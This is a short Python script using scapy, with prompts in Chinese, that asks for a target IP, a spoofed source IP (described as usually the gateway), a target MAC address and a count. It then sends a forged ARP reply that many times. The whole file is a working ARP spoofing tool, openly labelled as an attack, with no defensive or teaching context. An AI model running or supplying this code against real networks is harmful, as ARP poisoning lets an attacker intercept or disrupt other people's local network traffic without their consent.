import os
from scapy.all import *
from scapy.all import ARP, Ether, srp
from art import *
from colorama import init, Fore, Back, Style


ctrl = "0"

# import ip
# ip.Scan_for_IP

k_command = input(Fore.GREEN + "你要攻击哪一个IP？ >>>")
k_command2 = input("攻击源IP是什么？(一般为网关) >>> ")
arp_packet = ARP(pdst=k_command, psrc=k_command2)
k_command3 = input("要攻击的MAC地址是？ >>> ")
eth_packet = Ether(dst=k_command3)
packet = eth_packet/arp_packet
# 发送ARP数据包

num_attacks = int(input(Fore.RED + "你要攻击多少次? >>> "))
for i in range(num_attacks):
    send(packet)
